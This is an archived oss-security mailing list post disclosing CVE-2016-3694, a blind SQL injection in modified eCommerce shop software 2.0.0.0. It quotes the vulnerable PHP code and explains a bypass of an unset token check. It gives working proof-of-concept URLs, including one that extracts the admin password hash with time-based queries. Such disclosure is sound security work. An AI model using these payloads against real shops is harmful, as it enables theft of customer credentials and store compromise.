X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["4567" "Wednesday" "20" "April" "2016" "19:42:26" "+0200" "Felix Maduakor" "Felix.Maduakor@ruhr-uni-bochum.de" "<f7b02c4100f5b3b65652faed3d6999ee@mpx2.rz.ruhr-uni-bochum.de>" "117" "[oss-security] CVE-2016-3694 modified eCommerce Shopsoftware 2.0.0.0 rev 9678 - Blind SQL Injection" nil nil nil "4" "2016042017:42:26" "[oss-security] CVE-2016-3694 modified eCommerce Shopsoftware 2.0.0.0 rev 9678 - Blind SQL Injection" (number mark "U       Felix.Maduak Apr 20  117/4567  " thread-indent "\"[oss-security] CVE-2016-3694 modified eCommerce Shopsoftware 2.0.0.0 rev 9678 - Blind SQL Injection\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 8009 invoked by uid 550); 20 Apr 2016 18:11:24 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 25958 invoked from network); 20 Apr 2016 17:42:38 -0000
X-Envelope-Sender: <Felix.Maduakor@ruhr-uni-bochum.de>
X-RUB-Notes: Internal origin=134.147.42.227
X-Virus-Status: Clean
X-Virus-Scanned: clamav-milter 0.98.7 at mx2.mail.ruhr-uni-bochum.de
MIME-Version: 1.0
Content-Type: text/plain; charset=US-ASCII;
 format=flowed
Content-Transfer-Encoding: 7bit
Date: Wed, 20 Apr 2016 19:42:26 +0200
From: Felix Maduakor <Felix.Maduakor@ruhr-uni-bochum.de>
To: oss-security@lists.openwall.com
Message-ID: <f7b02c4100f5b3b65652faed3d6999ee@mpx2.rz.ruhr-uni-bochum.de>
X-Sender: Felix.Maduakor@ruhr-uni-bochum.de
User-Agent: RUB Webmail/1.1.4 via Mozilla/5.0 (X11; Ubuntu; Linux x86_64;
 rv:45.0) Gecko/20100101 Firefox/45.0
X-Virus-Scanned: clamav-milter 0.98.7 at mail1.mail.ruhr-uni-bochum.de
X-Virus-Status: Clean
Subject: [oss-security] CVE-2016-3694 modified eCommerce Shopsoftware 2.0.0.0 rev 9678 -
 Blind SQL Injection

# Title: Blind Injection modified eCommerce 2.0.0.0 rev 9678
# Date: 16.04.2016
# Category: webapps
# Vendor Homepage: http://www.modified-shop.org/download
# Software Link: 
http://www.modified-shop.org/forum/index.php?action=downloads;sa=downfile&id=96
# Version: 2.0.0.0 rev 9678
# Tested on: Apache/2.4.7, PHP Version 5.5.9, Linux
# Exploit Author: Felix Maduakor
# Contact: Felix.Maduakor@rub.de
# CVE: CVE-2016-3694

Product Description:
modified eCommerce is an Open Source shopsoftware

Vulnerability Details:
Attackable are the GET-parameters 'orders_status' and 'customers_status' 
through 'easybillcsv.php':


File: [shoproot]/api/easybill/easybillcsv.php

[24]        if (isset($_GET['token']) &&  $_GET['token'] == 
MODULE_EASYBILL_CSV_CRON_TOKEN) {
[25-61]         ...
[62]            } else {
[63]                    die('Direct Access to this location is not 
allowed.');

As default option the easybill-module is not installed and the constant 
MODULE_EASYBILL_CSV_CRON_TOKEN is not set. As long as the 
easybill-module is not installed, it is possible to bypass the 
restriction: 
[Shoproot]/api/easybill/easybillcsv.php?token=MODULE_EASYBILL_CSV_CRON_TOKEN


[35]            if (count($_GET['orders_status']) > 0) {
[36]            $_GET['orders_status'] = preg_replace("'[\r\n\s]+'", '', 
$_GET['orders_status']);
[37]            $orders_status = explode(',', $_GET['orders_status']);
[38]            $module->from_orders_status = implode("', '", 
$orders_status);
[39]            }


[43]            if (isset($_GET['customers_status'])) {
[44]            $_GET['customers_status'] = preg_replace("'[\r\n\s]+'", 
'', $_GET['customers_status']);
[45]            $customers_status = explode(',', 
$_GET['customers_status']);
[46]            $module->from_customers_status = implode("', '", 
$customers_status);
[47]            }

As you can see in lines 35-39 and 43-47 the GET-parameters 
'orders_status' and 'customers_status' are not escaped, but formatted 
(removed whitespaces, replaced commas with "', '"). They will be set as 
local variables of the "$module"-object.

File: [shoproot][admin-folder]/includes/modules/system/easybillcsv.php

[63]        $export_query = xtc_db_query("SELECT DISTINCT o.orders_id
[64]                                    FROM ".TABLE_ORDERS." o
[65]                                    JOIN 
".TABLE_ORDERS_STATUS_HISTORY." osh
[66]                                      ON o.orders_id = osh.orders_id
[67]                                   WHERE (o.orders_status IN ('" . 
$this->from_orders_status . "')
[68]                                          OR osh.orders_status_id IN 
('" . $this->from_orders_status . "'))
[69]                                     AND (o.last_modified >= '". 
date( "Y-m-d H:i:s", strtotime($this->from_order_date)) . "'
[70]                                          OR o.date_purchased >= '". 
date( "Y-m-d H:i:s", strtotime($this->from_order_date)) . "')
[71]                                     AND o.customers_status IN ('" . 
$this->from_customers_status . "')
[72]                                ORDER BY o.orders_id");


The unescaped GET-parameters get placed in the query on line 67, 68 and 
71.
Through the ORDER BY statement (with the explicit table-references) it 
is not possible to use a union-based injection.
The injection cannot include whitespaces or commas.

POC [Proof of Concept]:

http://127.0.0.1/shop/api/easybill/easybillcsv.php?token=MODULE_EASYBILL_CSV_CRON_TOKEN&orders_status=-111'))or-sleep(5)/*&customers_status=*/%23
Will result in following query and execute the sleep-function for 5 
seconds:

SELECT DISTINCT o.orders_id
                                    FROM ".TABLE_ORDERS." o
                                     JOIN ".TABLE_ORDERS_STATUS_HISTORY." 
osh
                                       ON o.orders_id = osh.orders_id
                                    WHERE (o.orders_status IN 
('-111'))or-sleep(5)/*

                                     long comment

                                     */#comment
                                ORDER BY o.orders_id

There are multiple ways to bypass the whitespace/comma-filter. A 
possible way to check if the first character of the admin-hash is '$' 
would be:


http://127.0.0.1/shop/api/easybill/easybillcsv.php?token=MODULE_EASYBILL_CSV_CRON_TOKEN&orders_status=-111'))or(Select(case(36)when(ascii(substring(`customers_password`FROM(1)FOR(1))))then-sleep(5)End)from`customers`where`customers_id`=1)/*&customers_status=*/%23




Timeline
-----
[16.04.2016] Reporting vulnerability to vendor
